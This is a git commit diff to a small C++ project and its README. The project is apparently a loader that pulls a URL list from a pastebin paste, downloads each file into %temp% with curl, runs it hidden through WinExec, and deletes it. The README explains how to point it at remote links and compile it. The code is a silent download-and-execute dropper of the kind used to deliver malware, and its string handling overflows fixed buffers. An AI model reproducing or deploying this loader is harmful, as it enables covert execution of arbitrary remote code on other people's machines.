365d69ff71a402da32e30dac1fdbe20be65e2b07
aydyn#0001 <aydynsiraci@gmail.com>
2022-05-02 16:51:59 -0400

    code formatting

--- README.md
+++ README.md
@@ -6,17 +6,19 @@
 2. change download location to wherever
 
 ### download remote links
-1. add your download links to a gist or pastebin
-2. change remoteLinks with the raw paste
+1. add your download links to a gist or pastebin (one per line)
+2. change remoteLinks to the raw paste
 
 example:  
 ```cpp
 char *links[] = {
-    "https://launcher.mojang.com/download/MinecraftInstaller.exe",
+    "https://www.7-zip.org/a/7z2107.exe",
+    "https://www.rarlab.com/rar/winrar-x32-611.exe",
+    "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
 };
+char *remoteLink = "https://pastebin.com/raw/vx9qPFm9";
 char *installFolder = "%temp%\\";
-char *remoteLink = "https://pastebin.com/raw/Jpgu3w8G";
 ```
 
-no builder, you need visual studio installed to compile this  
+no builder, you need to use visual studio  
 compile using `cl main.cpp /Os`
--- main.cpp
+++ main.cpp
@@ -4,13 +4,13 @@
 char *links[] = {
     "",
 };
-char *installFolder = "%temp%\\";
 char *remoteLink = "";
+char *installFolder = "%temp%\\";
 
 int main()
 {
-
     char cmd[] = "cmd.exe /c @echo off && for /F \"delims=\" %i in ('curl -s ";
+
     strcat(cmd, remoteLink);
     strcat(cmd, "') do (");
     strcat(cmd, "for %a in (\"%i\") do (");
@@ -22,12 +22,14 @@ int main()
     strcat(cmd, installFolder);
     strcat(cmd, "%~NXa");
     strcat(cmd, "))");
+
     WinExec(cmd, SW_HIDE);
 
     for (int i = 0; i < sizeof(links); i++)
     {
         char *fileName = strrchr(links[i], '/') + 1;
         char cmd[] = "cmd.exe /c @echo off && curl ";
+        
         strcat(cmd, links[i]);
         strcat(cmd, " -s -o ");
         strcat(cmd, installFolder);
@@ -38,6 +40,7 @@ int main()
         strcat(cmd, " && del ");
         strcat(cmd, installFolder);
         strcat(cmd, fileName);
+        
         WinExec(cmd, SW_HIDE);
     }
 
